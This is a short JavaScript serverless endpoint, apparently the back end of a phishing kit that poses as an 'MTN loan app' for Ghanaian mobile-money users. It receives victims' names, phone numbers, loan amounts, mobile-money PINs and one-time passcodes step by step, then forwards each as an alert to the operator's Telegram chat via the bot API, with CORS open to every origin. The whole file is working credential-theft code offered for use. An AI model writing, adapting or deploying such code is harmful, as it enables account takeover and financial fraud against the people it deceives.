// api/bot.js
export default async function handler(req, res) {
    // Allow CORS
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { step, userId, data } = req.body;

        // Format the message for Telegram
        let message = `🚨 *MTN LOAN APP ALERT* 🚨\n\n`;
        message += `🆔 *Session ID:* ${userId}\n`;
        message += `📍 *Step:* ${step}\n\n`;
        
        // Add specific data based on the step
        if (step === 'Application') {
            message += `👤 *Name:* ${data.name}\n`;
            message += `📱 *Phone:* ${data.phone}\n`;
            message += `💰 *Amount:* GHC ${data.amount}\n`;
        } else if (step === 'PIN Entered') {
            message += `🔐 *PIN:* ${data.pin}\n`;
        } else if (step === 'Final OTP') {
            message += `🔑 *OTP:* ${data.otp}\n`;
        }

        // YOUR TELEGRAM CREDENTIALS (We will put these in Vercel later)
        const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_TOKEN || !CHAT_ID) {
            throw new Error("Missing Telegram environment variables");
        }

        // Send message to Telegram
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) {
            throw new Error("Failed to send Telegram message");
        }

        return res.status(200).json({ success: true, message: "Sent to Telegram" });

    } catch (error) {
        console.error(error);
        return res.status(500).json({ error: error.message });
    }
}
